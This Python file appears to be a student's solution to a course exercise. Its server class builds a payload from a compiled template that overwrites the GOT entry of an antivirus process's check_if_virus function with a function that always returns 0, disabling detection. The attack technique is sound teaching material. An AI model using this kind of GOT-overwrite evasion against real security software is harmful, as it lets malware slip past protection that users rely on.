import addresses
import evasion


class SolutionServer(evasion.EvadeAntivirusServer):

    def get_payload(self, pid: int) -> bytes:
        """Returns a payload to replace the GOT entry for check_if_virus.

        Reminder: We want to replace it with another function of a similar
        signature, that will return 0.

        Notes:
        1. You can assume we already compiled q3.c into q3.template.
        2. Use addresses.CHECK_IF_VIRUS_GOT, addresses.CHECK_IF_VIRUS_ALTERNATIVE
           (and addresses.address_to_bytes).

        Returns:
             The bytes of the payload.
        """
        PATH_TO_TEMPLATE = './q3.template'
        with open(PATH_TO_TEMPLATE, 'rb') as reader:
            data = reader.read()
        # pid replacement
        data = data.replace(addresses.address_to_bytes(0x12345678), addresses.address_to_bytes(pid))
        # check_if_virus got entry replacement
        data = data.replace(addresses.address_to_bytes(0x87654321), addresses.address_to_bytes(addresses.CHECK_IF_VIRUS_GOT))
        # check_if_virus replacement got entry replacement
        data = data.replace(addresses.address_to_bytes(0x11111111), addresses.address_to_bytes(addresses.CHECK_IF_VIRUS_ALTERNATIVE))
        return data

    def print_handler(self, product: bytes):
        # WARNING: DON'T EDIT THIS FUNCTION!
        print(product.decode('latin-1'))

    def evade_antivirus(self, pid: int):
        # WARNING: DON'T EDIT THIS FUNCTION!
        self.add_payload(
            self.get_payload(pid),
            self.print_handler)


if __name__ == '__main__':
    SolutionServer().run_server(host='0.0.0.0', port=8000)
